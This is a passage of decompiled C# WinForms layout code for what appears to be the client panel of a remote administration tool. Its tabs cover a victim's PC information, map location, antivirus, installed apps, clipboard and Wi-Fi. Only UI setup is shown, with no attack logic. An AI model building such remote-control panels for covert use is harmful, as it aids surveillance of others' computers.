		((ToolStripItem)RefreshToolStripMenuItem).set_Name("RefreshToolStripMenuItem");
		ToolStripMenuItem refreshToolStripMenuItem = RefreshToolStripMenuItem;
		size = new Size(120, 22);
		((ToolStripItem)refreshToolStripMenuItem).set_Size(size);
		((ToolStripItem)RefreshToolStripMenuItem).set_Text("Refresh");
		((ToolStripItem)UninstallToolStripMenuItem).set_Image((Image)(object)Resources._1484270676_arrow_program);
		((ToolStripItem)UninstallToolStripMenuItem).set_Name("UninstallToolStripMenuItem");
		ToolStripMenuItem uninstallToolStripMenuItem = UninstallToolStripMenuItem;
		size = new Size(120, 22);
		((ToolStripItem)uninstallToolStripMenuItem).set_Size(size);
		((ToolStripItem)UninstallToolStripMenuItem).set_Text("Uninstall");
		ImageList4.set_ImageStream((ImageListStreamer)componentResourceManager.GetObject("ImageList4.ImageStream"));
		ImageList4.set_TransparentColor(Color.Transparent);
		ImageList4.get_Images().SetKeyName(0, "Uninstall-Tool-icon.png");
		((ToolStrip)ContextMenuStrip2).get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[3]
		{
			(ToolStripItem)ToolStripMenuItem1,
			(ToolStripItem)ToolStripMenuItem2,
			(ToolStripItem)ToolStripMenuItem3
		});
		((Control)ContextMenuStrip2).set_Name("ContextMenuStrip2");
		ContextMenuStrip contextMenuStrip2 = ContextMenuStrip2;
		size = new Size(160, 70);
		((Control)contextMenuStrip2).set_Size(size);
		((ToolStripItem)ToolStripMenuItem1).set_Image((Image)(object)Resources._1484276596_clipboard_download);
		((ToolStripItem)ToolStripMenuItem1).set_Name("ToolStripMenuItem1");
		ToolStripMenuItem toolStripMenuItem = ToolStripMenuItem1;
		size = new Size(159, 22);
		((ToolStripItem)toolStripMenuItem).set_Size(size);
		((ToolStripItem)ToolStripMenuItem1).set_Text("Get Clipboard");
		((ToolStripItem)ToolStripMenuItem2).set_Image((Image)(object)Resources._1484276707_clipboard_add);
		((ToolStripItem)ToolStripMenuItem2).set_Name("ToolStripMenuItem2");
		ToolStripMenuItem toolStripMenuItem2 = ToolStripMenuItem2;
		size = new Size(159, 22);
		((ToolStripItem)toolStripMenuItem2).set_Size(size);
		((ToolStripItem)ToolStripMenuItem2).set_Text("Set Clipboard");
		((ToolStripItem)ToolStripMenuItem3).set_Image((Image)(object)Resources._1484276550_clipboard_delete);
		((ToolStripItem)ToolStripMenuItem3).set_Name("ToolStripMenuItem3");
		ToolStripMenuItem toolStripMenuItem3 = ToolStripMenuItem3;
		size = new Size(159, 22);
		((ToolStripItem)toolStripMenuItem3).set_Size(size);
		((ToolStripItem)ToolStripMenuItem3).set_Text("CLear ClipBoard");
		ImageList3.set_ImageStream((ImageListStreamer)componentResourceManager.GetObject("ImageList3.ImageStream"));
		ImageList3.set_TransparentColor(Color.Transparent);
		ImageList3.get_Images().SetKeyName(0, "1484268810_signal-4.png");
		ImageList3.get_Images().SetKeyName(1, "1484268804_signal-3.png");
		ImageList3.get_Images().SetKeyName(2, "1484268793_signal-2.png");
		ImageList3.get_Images().SetKeyName(3, "1484268817_signal-1.png");
		((ToolStrip)ContextMenuStrip4).get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[2]
		{
			(ToolStripItem)RefreshToolStripMenuItem1,
			(ToolStripItem)RemoveToolStripMenuItem
		});
		((Control)ContextMenuStrip4).set_Name("ContextMenuStrip4");
		ContextMenuStrip contextMenuStrip3 = ContextMenuStrip4;
		size = new Size(114, 48);
		((Control)contextMenuStrip3).set_Size(size);
		((ToolStripItem)RefreshToolStripMenuItem1).set_Image((Image)(object)Resources._1484270709_view_refresh);
		((ToolStripItem)RefreshToolStripMenuItem1).set_Name("RefreshToolStripMenuItem1");
		ToolStripMenuItem refreshToolStripMenuItem2 = RefreshToolStripMenuItem1;
		size = new Size(113, 22);
		((ToolStripItem)refreshToolStripMenuItem2).set_Size(size);
		((ToolStripItem)RefreshToolStripMenuItem1).set_Text("Refresh");
		((ToolStripItem)RemoveToolStripMenuItem).set_Image((Image)(object)Resources._1484282771_DeleteRed);
		((ToolStripItem)RemoveToolStripMenuItem).set_Name("RemoveToolStripMenuItem");
		ToolStripMenuItem removeToolStripMenuItem = RemoveToolStripMenuItem;
		size = new Size(113, 22);
		((ToolStripItem)removeToolStripMenuItem).set_Size(size);
		((ToolStripItem)RemoveToolStripMenuItem).set_Text("Delete");
		ImageList6.set_ImageStream((ImageListStreamer)componentResourceManager.GetObject("ImageList6.ImageStream"));
		ImageList6.set_TransparentColor(Color.Transparent);
		ImageList6.get_Images().SetKeyName(0, "1472246122_Registry.png");
		ImageList6.get_Images().SetKeyName(1, "software-icon.png");
		((ToolStrip)ContextMenuStrip5).get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[2]
		{
			(ToolStripItem)ToolStripMenuItem7,
			(ToolStripItem)ToolStripMenuItem8
		});
		((Control)ContextMenuStrip5).set_Name("ContextMenuStrip4");
		ContextMenuStrip contextMenuStrip4 = ContextMenuStrip5;
		size = new Size(114, 48);
		((Control)contextMenuStrip4).set_Size(size);
		((ToolStripItem)ToolStripMenuItem7).set_Image((Image)(object)Resources._1484270709_view_refresh);
		((ToolStripItem)ToolStripMenuItem7).set_Name("ToolStripMenuItem7");
		ToolStripMenuItem toolStripMenuItem4 = ToolStripMenuItem7;
		size = new Size(113, 22);
		((ToolStripItem)toolStripMenuItem4).set_Size(size);
		((ToolStripItem)ToolStripMenuItem7).set_Text("Refresh");
		((ToolStripItem)ToolStripMenuItem8).set_Image((Image)(object)Resources._1484282771_DeleteRed);
		((ToolStripItem)ToolStripMenuItem8).set_Name("ToolStripMenuItem8");
		ToolStripMenuItem toolStripMenuItem5 = ToolStripMenuItem8;
		size = new Size(113, 22);
		((ToolStripItem)toolStripMenuItem5).set_Size(size);
		((ToolStripItem)ToolStripMenuItem8).set_Text("Delete");
		((ToolStrip)ContextMenuStrip3).get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[3]
		{
			(ToolStripItem)ToolStripMenuItem4,
			(ToolStripItem)ToolStripMenuItem5,
			(ToolStripItem)ToolStripMenuItem6
		});
		((Control)ContextMenuStrip3).set_Name("ContextMenuStrip3");
		ContextMenuStrip contextMenuStrip5 = ContextMenuStrip3;
		size = new Size(114, 70);
		((Control)contextMenuStrip5).set_Size(size);
		((ToolStripItem)ToolStripMenuItem4).set_Image((Image)(object)Resources._1484270709_view_refresh);
		((ToolStripItem)ToolStripMenuItem4).set_Name("ToolStripMenuItem4");
		ToolStripMenuItem toolStripMenuItem6 = ToolStripMenuItem4;
		size = new Size(113, 22);
		((ToolStripItem)toolStripMenuItem6).set_Size(size);
		((ToolStripItem)ToolStripMenuItem4).set_Text("Refresh");
		((ToolStripItem)ToolStripMenuItem5).set_Image((Image)(object)Resources._1484278277_Raise);
		((ToolStripItem)ToolStripMenuItem5).set_Name("ToolStripMenuItem5");
		ToolStripMenuItem toolStripMenuItem7 = ToolStripMenuItem5;
		size = new Size(113, 22);
		((ToolStripItem)toolStripMenuItem7).set_Size(size);
		((ToolStripItem)ToolStripMenuItem5).set_Text("Update");
		((ToolStripItem)ToolStripMenuItem6).set_Image((Image)(object)Resources._1484170487_edit_clear);
		((ToolStripItem)ToolStripMenuItem6).set_Name("ToolStripMenuItem6");
		ToolStripMenuItem toolStripMenuItem8 = ToolStripMenuItem6;
		size = new Size(113, 22);
		((ToolStripItem)toolStripMenuItem8).set_Size(size);
		((ToolStripItem)ToolStripMenuItem6).set_Text("Clear");
		((TabControl)EtherealTabControl1).set_Alignment((TabAlignment)2);
		((Control)EtherealTabControl1).get_Controls().Add((Control)(object)TabPage1);
		((Control)EtherealTabControl1).get_Controls().Add((Control)(object)TabPage2);
		((Control)EtherealTabControl1).get_Controls().Add((Control)(object)TabPage3);
		((Control)EtherealTabControl1).get_Controls().Add((Control)(object)TabPage4);
		((Control)EtherealTabControl1).get_Controls().Add((Control)(object)TabPage5);
		((Control)EtherealTabControl1).get_Controls().Add((Control)(object)TabPage6);
		((Control)EtherealTabControl1).get_Controls().Add((Control)(object)TabPage7);
		((Control)EtherealTabControl1).get_Controls().Add((Control)(object)TabPage8);
		((Control)EtherealTabControl1).set_Dock((DockStyle)5);
		((TabControl)EtherealTabControl1).set_ImageList(ImageList1);
		EtherealTabControl etherealTabControl = EtherealTabControl1;
		size = new Size(40, 150);
		((TabControl)etherealTabControl).set_ItemSize(size);
		EtherealTabControl etherealTabControl2 = EtherealTabControl1;
		Point location = new Point(0, 0);
		((Control)etherealTabControl2).set_Location(location);
		((TabControl)EtherealTabControl1).set_Multiline(true);
		((Control)EtherealTabControl1).set_Name("EtherealTabControl1");
		((TabControl)EtherealTabControl1).set_SelectedIndex(0);
		EtherealTabControl etherealTabControl3 = EtherealTabControl1;
		size = new Size(1047, 466);
		((Control)etherealTabControl3).set_Size(size);
		((TabControl)EtherealTabControl1).set_SizeMode((TabSizeMode)2);
		((Control)EtherealTabControl1).set_TabIndex(0);
		((Control)TabPage1).get_Controls().Add((Control)(object)ListView1);
		((Control)TabPage1).get_Controls().Add((Control)(object)Panel1);
		((Control)TabPage1).get_Controls().Add((Control)(object)StatusStrip1);
		TabPage1.set_ImageKey("pcinf.png");
		TabPage tabPage = TabPage1;
		location = new Point(154, 4);
		tabPage.set_Location(location);
		((Control)TabPage1).set_Name("TabPage1");
		TabPage tabPage2 = TabPage1;
		Padding padding = default(Padding);
		((Padding)(ref padding))._002Ector(3);
		((Control)tabPage2).set_Padding(padding);
		TabPage tabPage3 = TabPage1;
		size = new Size(889, 458);
		((Control)tabPage3).set_Size(size);
		TabPage1.set_TabIndex(0);
		TabPage1.set_Text("PC Information");
		TabPage1.set_UseVisualStyleBackColor(true);
		ListView1.get_Columns().AddRange((ColumnHeader[])(object)new ColumnHeader[1] { ColumnHeader1 });
		((Control)ListView1).set_Dock((DockStyle)5);
		((Control)ListView1).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		ListView listView = ListView1;
		location = new Point(3, 3);
		((Control)listView).set_Location(location);
		((Control)ListView1).set_Name("ListView1");
		ListView listView2 = ListView1;
		size = new Size(883, 395);
		((Control)listView2).set_Size(size);
		ListView1.set_SmallImageList(ImageList2);
		((Control)ListView1).set_TabIndex(4);
		ListView1.set_UseCompatibleStateImageBehavior(false);
		ListView1.set_View((View)1);
		ColumnHeader1.set_Text("");
		ColumnHeader1.set_Width(878);
		((Control)Panel1).get_Controls().Add((Control)(object)clearpcinf);
		((Control)Panel1).get_Controls().Add((Control)(object)refpcinf);
		((Control)Panel1).set_Dock((DockStyle)2);
		Panel panel = Panel1;
		location = new Point(3, 398);
		((Control)panel).set_Location(location);
		((Control)Panel1).set_Name("Panel1");
		Panel panel2 = Panel1;
		size = new Size(883, 35);
		((Control)panel2).set_Size(size);
		((Control)Panel1).set_TabIndex(3);
		((Control)clearpcinf).set_Anchor((AnchorStyles)6);
		((ButtonBase)clearpcinf).set_Image((Image)(object)Resources._1484170487_edit_clear1);
		Button obj = clearpcinf;
		location = new Point(3, 6);
		((Control)obj).set_Location(location);
		((Control)clearpcinf).set_Name("clearpcinf");
		Button obj2 = clearpcinf;
		size = new Size(75, 23);
		((Control)obj2).set_Size(size);
		((Control)clearpcinf).set_TabIndex(3);
		((ButtonBase)clearpcinf).set_Text(" Clear");
		((ButtonBase)clearpcinf).set_TextImageRelation((TextImageRelation)4);
		((ButtonBase)clearpcinf).set_UseCompatibleTextRendering(true);
		((ButtonBase)clearpcinf).set_UseVisualStyleBackColor(true);
		((Control)refpcinf).set_Anchor((AnchorStyles)6);
		((ButtonBase)refpcinf).set_Image((Image)(object)Resources._1484170437_arrow_refresh);
		Button obj3 = refpcinf;
		location = new Point(84, 6);
		((Control)obj3).set_Location(location);
		((Control)refpcinf).set_Name("refpcinf");
		Button obj4 = refpcinf;
		size = new Size(75, 23);
		((Control)obj4).set_Size(size);
		((Control)refpcinf).set_TabIndex(2);
		((ButtonBase)refpcinf).set_Text(" Refresh");
		((ButtonBase)refpcinf).set_TextImageRelation((TextImageRelation)4);
		((ButtonBase)refpcinf).set_UseCompatibleTextRendering(true);
		((ButtonBase)refpcinf).set_UseVisualStyleBackColor(true);
		((ToolStrip)StatusStrip1).get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[1] { (ToolStripItem)ToolStripStatusLabel1 });
		StatusStrip statusStrip = StatusStrip1;
		location = new Point(3, 433);
		((Control)statusStrip).set_Location(location);
		((Control)StatusStrip1).set_Name("StatusStrip1");
		StatusStrip statusStrip2 = StatusStrip1;
		size = new Size(883, 22);
		((Control)statusStrip2).set_Size(size);
		((Control)StatusStrip1).set_TabIndex(0);
		((Control)StatusStrip1).set_Text("StatusStrip1");
		((ToolStripItem)ToolStripStatusLabel1).set_Name("ToolStripStatusLabel1");
		ToolStripStatusLabel toolStripStatusLabel = ToolStripStatusLabel1;
		size = new Size(139, 17);
		((ToolStripItem)toolStripStatusLabel).set_Size(size);
		((ToolStripItem)ToolStripStatusLabel1).set_Text("Ready to any command !");
		((Control)TabPage2).get_Controls().Add((Control)(object)PM);
		((Control)TabPage2).get_Controls().Add((Control)(object)Panel5);
		((Control)TabPage2).get_Controls().Add((Control)(object)Panel4);
		((Control)TabPage2).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		TabPage2.set_ImageKey("pcinf.png");
		TabPage tabPage4 = TabPage2;
		location = new Point(154, 4);
		tabPage4.set_Location(location);
		((Control)TabPage2).set_Name("TabPage2");
		TabPage tabPage5 = TabPage2;
		((Padding)(ref padding))._002Ector(3);
		((Control)tabPage5).set_Padding(padding);
		TabPage tabPage6 = TabPage2;
		size = new Size(889, 458);
		((Control)tabPage6).set_Size(size);
		TabPage2.set_TabIndex(1);
		TabPage2.set_Text("Client Map");
		TabPage2.set_UseVisualStyleBackColor(true);
		((Control)PM).set_BackColor(Color.Black);
		((Control)PM).set_Dock((DockStyle)5);
		PictureBox pM = PM;
		location = new Point(237, 3);
		((Control)pM).set_Location(location);
		((Control)PM).set_Name("PM");
		PictureBox pM2 = PM;
		size = new Size(649, 412);
		((Control)pM2).set_Size(size);
		PM.set_SizeMode((PictureBoxSizeMode)1);
		PM.set_TabIndex(2);
		PM.set_TabStop(false);
		((Control)Panel5).get_Controls().Add((Control)(object)ListView3);
		((Control)Panel5).set_Dock((DockStyle)3);
		Panel panel3 = Panel5;
		location = new Point(3, 3);
		((Control)panel3).set_Location(location);
		((Control)Panel5).set_Name("Panel5");
		Panel panel4 = Panel5;
		size = new Size(234, 412);
		((Control)panel4).set_Size(size);
		((Control)Panel5).set_TabIndex(1);
		ListView3.get_Columns().AddRange((ColumnHeader[])(object)new ColumnHeader[2] { ColumnHeader12, ColumnHeader13 });
		((Control)ListView3).set_Dock((DockStyle)5);
		((Control)ListView3).set_Font(new Font("Verdana", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		ListView3.set_FullRowSelect(true);
		ListView3.set_GridLines(true);
		ListView3.get_Items().AddRange((ListViewItem[])(object)new ListViewItem[9] { val, val2, val3, val4, val5, val6, val7, val8, val9 });
		ListView listView3 = ListView3;
		location = new Point(0, 0);
		((Control)listView3).set_Location(location);
		((Control)ListView3).set_Name("ListView3");
		ListView listView4 = ListView3;
		size = new Size(234, 412);
		((Control)listView4).set_Size(size);
		((Control)ListView3).set_TabIndex(0);
		ListView3.set_UseCompatibleStateImageBehavior(false);
		ListView3.set_View((View)1);
		ColumnHeader12.set_Text("Info");
		ColumnHeader12.set_Width(95);
		ColumnHeader13.set_Text("Location Info");
		ColumnHeader13.set_Width(133);
		((Control)Panel4).get_Controls().Add((Control)(object)RFM);
		((Control)Panel4).set_Dock((DockStyle)2);
		Panel panel5 = Panel4;
		location = new Point(3, 415);
		((Control)panel5).set_Location(location);
		((Control)Panel4).set_Name("Panel4");
		Panel panel6 = Panel4;
		size = new Size(883, 40);
		((Control)panel6).set_Size(size);
		((Control)Panel4).set_TabIndex(0);
		((ButtonBase)RFM).set_Image((Image)(object)Resources._1484170437_arrow_refresh);
		Button rFM = RFM;
		location = new Point(3, 6);
		((Control)rFM).set_Location(location);
		((Control)RFM).set_Name("RFM");
		Button rFM2 = RFM;
		size = new Size(108, 23);
		((Control)rFM2).set_Size(size);
		((Control)RFM).set_TabIndex(3);
		((ButtonBase)RFM).set_Text(" Refresh Map");
		((ButtonBase)RFM).set_TextImageRelation((TextImageRelation)4);
		((ButtonBase)RFM).set_UseCompatibleTextRendering(true);
		((ButtonBase)RFM).set_UseVisualStyleBackColor(true);
		((Control)TabPage3).get_Controls().Add((Control)(object)AVLIST);
		((Control)TabPage3).get_Controls().Add((Control)(object)Panel3);
		((Control)TabPage3).get_Controls().Add((Control)(object)StatusStrip4);
		TabPage3.set_ImageKey("pcinf.png");
		TabPage tabPage7 = TabPage3;
		location = new Point(154, 4);
		tabPage7.set_Location(location);
		((Control)TabPage3).set_Name("TabPage3");
		TabPage tabPage8 = TabPage3;
		((Padding)(ref padding))._002Ector(3);
		((Control)tabPage8).set_Padding(padding);
		TabPage tabPage9 = TabPage3;
		size = new Size(889, 458);
		((Control)tabPage9).set_Size(size);
		TabPage3.set_TabIndex(2);
		TabPage3.set_Text("Antivirus Inf");
		TabPage3.set_UseVisualStyleBackColor(true);
		AVLIST.get_Columns().AddRange((ColumnHeader[])(object)new ColumnHeader[2] { ColumnHeader10, ColumnHeader11 });
		((Control)AVLIST).set_Dock((DockStyle)5);
		((Control)AVLIST).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		AVLIST.set_FullRowSelect(true);
		ListView aVLIST = AVLIST;
		location = new Point(3, 3);
		((Control)aVLIST).set_Location(location);
		((Control)AVLIST).set_Name("AVLIST");
		ListView aVLIST2 = AVLIST;
		size = new Size(883, 395);
		((Control)aVLIST2).set_Size(size);
		AVLIST.set_SmallImageList(ImageList5);
		((Control)AVLIST).set_TabIndex(7);
		AVLIST.set_UseCompatibleStateImageBehavior(false);
		AVLIST.set_View((View)1);
		ColumnHeader10.set_Text("Information");
		ColumnHeader10.set_Width(163);
		ColumnHeader11.set_Text("Output");
		ColumnHeader11.set_Width(541);
		((Control)Panel3).get_Controls().Add((Control)(object)CAVLIST);
		((Control)Panel3).get_Controls().Add((Control)(object)AVRE);
		((Control)Panel3).set_Dock((DockStyle)2);
		Panel panel7 = Panel3;
		location = new Point(3, 398);
		((Control)panel7).set_Location(location);
		((Control)Panel3).set_Name("Panel3");
		Panel panel8 = Panel3;
		size = new Size(883, 35);
		((Control)panel8).set_Size(size);
		((Control)Panel3).set_TabIndex(6);
		((ButtonBase)CAVLIST).set_Image((Image)(object)Resources._1484170487_edit_clear1);
		Button cAVLIST = CAVLIST;
		location = new Point(3, 6);
		((Control)cAVLIST).set_Location(location);
		((Control)CAVLIST).set_Name("CAVLIST");
		Button cAVLIST2 = CAVLIST;
		size = new Size(75, 23);
		((Control)cAVLIST2).set_Size(size);
		((Control)CAVLIST).set_TabIndex(3);
		((ButtonBase)CAVLIST).set_Text(" Clear");
		((ButtonBase)CAVLIST).set_TextImageRelation((TextImageRelation)4);
		((ButtonBase)CAVLIST).set_UseCompatibleTextRendering(true);
		((ButtonBase)CAVLIST).set_UseVisualStyleBackColor(true);
		((ButtonBase)AVRE).set_Image((Image)(object)Resources._1484170437_arrow_refresh);
		Button aVRE = AVRE;
		location = new Point(84, 6);
		((Control)aVRE).set_Location(location);
		((Control)AVRE).set_Name("AVRE");
		Button aVRE2 = AVRE;
		size = new Size(75, 23);
		((Control)aVRE2).set_Size(size);
		((Control)AVRE).set_TabIndex(2);
		((ButtonBase)AVRE).set_Text(" Refresh");
		((ButtonBase)AVRE).set_TextImageRelation((TextImageRelation)4);
		((ButtonBase)AVRE).set_UseCompatibleTextRendering(true);
		((ButtonBase)AVRE).set_UseVisualStyleBackColor(true);
		((ToolStrip)StatusStrip4).get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[1] { (ToolStripItem)ToolStripStatusLabel4 });
		StatusStrip statusStrip3 = StatusStrip4;
		location = new Point(3, 433);
		((Control)statusStrip3).set_Location(location);
		((Control)StatusStrip4).set_Name("StatusStrip4");
		StatusStrip statusStrip4 = StatusStrip4;
		size = new Size(883, 22);
		((Control)statusStrip4).set_Size(size);
		((Control)StatusStrip4).set_TabIndex(5);
		((Control)StatusStrip4).set_Text("StatusStrip4");
		((ToolStripItem)ToolStripStatusLabel4).set_Name("ToolStripStatusLabel4");
		ToolStripStatusLabel toolStripStatusLabel2 = ToolStripStatusLabel4;
		size = new Size(139, 17);
		((ToolStripItem)toolStripStatusLabel2).set_Size(size);
		((ToolStripItem)ToolStripStatusLabel4).set_Text("Ready to any command !");
		((Control)TabPage4).get_Controls().Add((Control)(object)StatusStrip3);
		((Control)TabPage4).get_Controls().Add((Control)(object)ListView2);
		TabPage4.set_ImageKey("pcinf.png");
		TabPage tabPage10 = TabPage4;
		location = new Point(154, 4);
		tabPage10.set_Location(location);
		((Control)TabPage4).set_Name("TabPage4");
		TabPage tabPage11 = TabPage4;
		((Padding)(ref padding))._002Ector(3);
		((Control)tabPage11).set_Padding(padding);
		TabPage tabPage12 = TabPage4;
		size = new Size(889, 458);
		((Control)tabPage12).set_Size(size);
		TabPage4.set_TabIndex(3);
		TabPage4.set_Text("Uninstall App");
		TabPage4.set_UseVisualStyleBackColor(true);
		((ToolStrip)StatusStrip3).get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[1] { (ToolStripItem)ToolStripStatusLabel3 });
		StatusStrip statusStrip5 = StatusStrip3;
		location = new Point(3, 433);
		((Control)statusStrip5).set_Location(location);
		((Control)StatusStrip3).set_Name("StatusStrip3");
		StatusStrip statusStrip6 = StatusStrip3;
		size = new Size(883, 22);
		((Control)statusStrip6).set_Size(size);
		((Control)StatusStrip3).set_TabIndex(1);
		((Control)StatusStrip3).set_Text("StatusStrip3");
		((ToolStripItem)ToolStripStatusLabel3).set_Name("ToolStripStatusLabel3");
		ToolStripStatusLabel toolStripStatusLabel3 = ToolStripStatusLabel3;
		size = new Size(139, 17);
		((ToolStripItem)toolStripStatusLabel3).set_Size(size);
		((ToolStripItem)ToolStripStatusLabel3).set_Text("Ready to any command !");
		((Control)ListView2).set_Anchor((AnchorStyles)15);
		ListView2.get_Columns().AddRange((ColumnHeader[])(object)new ColumnHeader[5] { ColumnHeader2, ColumnHeader6, ColumnHeader7, ColumnHeader8, ColumnHeader9 });
		((Control)ListView2).set_ContextMenuStrip(ContextMenuStrip1);
		((Control)ListView2).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		ListView2.set_FullRowSelect(true);
		ListView2.set_GridLines(true);
		ListView listView5 = ListView2;
		location = new Point(3, 3);
		((Control)listView5).set_Location(location);
		((Control)ListView2).set_Name("ListView2");
		ListView listView6 = ListView2;
		size = new Size(883, 427);
		((Control)listView6).set_Size(size);
		ListView2.set_SmallImageList(ImageList4);
		((Control)ListView2).set_TabIndex(0);
		ListView2.set_UseCompatibleStateImageBehavior(false);
		ListView2.set_View((View)1);
		ColumnHeader2.set_Text("Display Name");
		ColumnHeader2.set_Width(216);
		ColumnHeader6.set_Text("Version");
		ColumnHeader6.set_Width(59);
		ColumnHeader7.set_Text("Path");
		ColumnHeader7.set_Width(131);
		ColumnHeader8.set_Text("Publisher");
		ColumnHeader8.set_Width(126);
		ColumnHeader9.set_Text("Uninstall String");
		ColumnHeader9.set_Width(114);
		((Control)TabPage5).get_Controls().Add((Control)(object)Textc);
		((Control)TabPage5).get_Controls().Add((Control)(object)StatusStrip5);
		TabPage5.set_ImageKey("pcinf.png");
		TabPage tabPage13 = TabPage5;
		location = new Point(154, 4);
		tabPage13.set_Location(location);
		((Control)TabPage5).set_Name("TabPage5");
		TabPage tabPage14 = TabPage5;
		((Padding)(ref padding))._002Ector(3);
		((Control)tabPage14).set_Padding(padding);
		TabPage tabPage15 = TabPage5;
		size = new Size(889, 458);
		((Control)tabPage15).set_Size(size);
		TabPage5.set_TabIndex(4);
		TabPage5.set_Text("Clipboard Manager");
		TabPage5.set_UseVisualStyleBackColor(true);
		((Control)Textc).set_ContextMenuStrip(ContextMenuStrip2);
		((Control)Textc).set_Dock((DockStyle)5);
		((Control)Textc).set_Font(new Font("Verdana", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		TextBox textc = Textc;
		location = new Point(3, 3);
		((Control)textc).set_Location(location);
		Textc.set_Multiline(true);
		((Control)Textc).set_Name("Textc");
		TextBox textc2 = Textc;
		size = new Size(883, 430);
		((Control)textc2).set_Size(size);
		((Control)Textc).set_TabIndex(1);
		((ToolStrip)StatusStrip5).get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[1] { (ToolStripItem)ToolStripStatusLabel5 });
		StatusStrip statusStrip7 = StatusStrip5;
		location = new Point(3, 433);
		((Control)statusStrip7).set_Location(location);
		((Control)StatusStrip5).set_Name("StatusStrip5");
		StatusStrip statusStrip8 = StatusStrip5;
		size = new Size(883, 22);
		((Control)statusStrip8).set_Size(size);
		((Control)StatusStrip5).set_TabIndex(0);
		((Control)StatusStrip5).set_Text("StatusStrip5");
		((ToolStripItem)ToolStripStatusLabel5).set_Name("ToolStripStatusLabel5");
		ToolStripStatusLabel toolStripStatusLabel4 = ToolStripStatusLabel5;
		size = new Size(139, 17);
		((ToolStripItem)toolStripStatusLabel4).set_Size(size);
		((ToolStripItem)ToolStripStatusLabel5).set_Text("Ready to any command !");
		((Control)TabPage6).get_Controls().Add((Control)(object)Panel2);
		((Control)TabPage6).get_Controls().Add((Control)(object)StatusStrip2);
		((Control)TabPage6).get_Controls().Add((Control)(object)WIL);
		TabPage6.set_ImageKey("pcinf.png");
		TabPage tabPage16 = TabPage6;
		location = new Point(154, 4);
		tabPage16.set_Location(location);
		((Control)TabPage6).set_Name("TabPage6");
		TabPage tabPage17 = TabPage6;
		((Padding)(ref padding))._002Ector(3);
		((Control)tabPage17).set_Padding(padding);
		TabPage tabPage18 = TabPage6;
		size = new Size(889, 458);
		((Control)tabPage18).set_Size(size);
		TabPage6.set_TabIndex(5);
		TabPage6.set_Text("Wifi Monitor");
		TabPage6.set_UseVisualStyleBackColor(true);
		((Control)Panel2).get_Controls().Add((Control)(object)CWL);
		((Control)Panel2).get_Controls().Add((Control)(object)RWL);
		((Control)Panel2).set_Dock((DockStyle)2);
		Panel panel9 = Panel2;
		location = new Point(3, 399);
		((Control)panel9).set_Location(location);
		((Control)Panel2).set_Name("Panel2");
		Panel panel10 = Panel2;
		size = new Size(883, 34);
		((Control)panel10).set_Size(size);
		((Control)Panel2).set_TabIndex(9);
		((ButtonBase)CWL).set_Image((Image)(object)Resources._1484170487_edit_clear1);
		Button cWL = CWL;
		location = new Point(3, 5);
		((Control)cWL).set_Location(location);
		((Control)CWL).set_Name("CWL");
		Button cWL2 = CWL;
		size = new Size(75, 23);
		((Control)cWL2).set_Size(size);
		((Control)CWL).set_TabIndex(9);
		((ButtonBase)CWL).set_Text(" Clear");
		((ButtonBase)CWL).set_TextImageRelation((TextImageRelation)4);
		((ButtonBase)CWL).set_UseCompatibleTextRendering(true);
		((ButtonBase)CWL).set_UseVisualStyleBackColor(true);
		((ButtonBase)RWL).set_Image((Image)(object)Resources._1484170437_arrow_refresh);
		Button rWL = RWL;
		location = new Point(84, 5);
		((Control)rWL).set_Location(location);
		((Control)RWL).set_Name("RWL");
		Button rWL2 = RWL;
		size = new Size(75, 23);
		((Control)rWL2).set_Size(size);
		((Control)RWL).set_TabIndex(8);
		((ButtonBase)RWL).set_Text(" Refresh");
		((ButtonBase)RWL).set_TextImageRelation((TextImageRelation)4);
		((ButtonBase)RWL).set_UseCompatibleTextRendering(true);
		((ButtonBase)RWL).set_UseVisualStyleBackColor(true);
		((ToolStrip)StatusStrip2).get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[1] { (ToolStripItem)ToolStripStatusLabel2 });
		StatusStrip statusStrip9 = StatusStrip2;
		location = new Point(3, 433);
		((Control)statusStrip9).set_Location(location);
		((Control)StatusStrip2).set_Name("StatusStrip2");
		StatusStrip statusStrip10 = StatusStrip2;
		size = new Size(883, 22);
		((Control)statusStrip10).set_Size(size);
		((Control)StatusStrip2).set_TabIndex(5);
		((Control)StatusStrip2).set_Text("StatusStrip2");
		((ToolStripItem)ToolStripStatusLabel2).set_Name("ToolStripStatusLabel2");
		ToolStripStatusLabel toolStripStatusLabel5 = ToolStripStatusLabel2;
		size = new Size(139, 17);
		((ToolStripItem)toolStripStatusLabel5).set_Size(size);
		((ToolStripItem)ToolStripStatusLabel2).set_Text("Ready to any command !");
		((Control)WIL).set_Anchor((AnchorStyles)15);
		WIL.get_Columns().AddRange((ColumnHeader[])(object)new ColumnHeader[3] { ColumnHeader3, ColumnHeader4, ColumnHeader5 });
		((Control)WIL).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		WIL.set_FullRowSelect(true);
		WIL.set_GridLines(true);
		ListView wIL = WIL;
		location = new Point(3, 3);
		((Control)wIL).set_Location(location);
		((Control)WIL).set_Name("WIL");
		ListView wIL2 = WIL;
		size = new Size(883, 395);
		((Control)wIL2).set_Size(size);
		WIL.set_SmallImageList(ImageList3);
		((Control)WIL).set_TabIndex(8);
		WIL.set_UseCompatibleStateImageBehavior(false);
		WIL.set_View((View)1);
		ColumnHeader3.set_Text("SSID");
		ColumnHeader3.set_Width(115);
		ColumnHeader4.set_Text("Signal Strength");
		ColumnHeader4.set_Width(113);
		ColumnHeader5.set_Text("Mac Address");
		ColumnHeader5.set_Width(445);
		((Control)TabPage7).get_Controls().Add((Control)(object)TabControl1);
